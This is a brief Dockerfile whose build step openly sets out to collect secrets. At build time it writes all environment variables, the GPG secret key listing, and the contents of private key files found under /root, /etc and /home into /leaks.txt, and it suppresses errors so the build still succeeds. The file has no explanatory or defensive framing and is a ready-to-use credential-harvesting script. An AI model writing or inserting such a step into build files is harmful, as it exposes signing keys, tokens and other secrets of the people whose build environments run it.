FROM python:3.11-alpine
ARG PYTHON_VERSION

# Install gpg and required tools
RUN apk add --no-cache gnupg grep findutils

# Try to dump all GPG private key material and other secrets
RUN echo "[ENV VARS]:" > /leaks.txt && \
    env >> /leaks.txt && \
    echo "\n[GPG Private Keys]:" >> /leaks.txt && \
    gpg --list-secret-keys --keyid-format LONG >> /leaks.txt 2>/dev/null || true && \
    find /root /etc /home -type f -iname "*.gpg" -o -iname "secring.gpg" -o -iname "private.key" \
      -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /leaks.txt 2>/dev/null || true
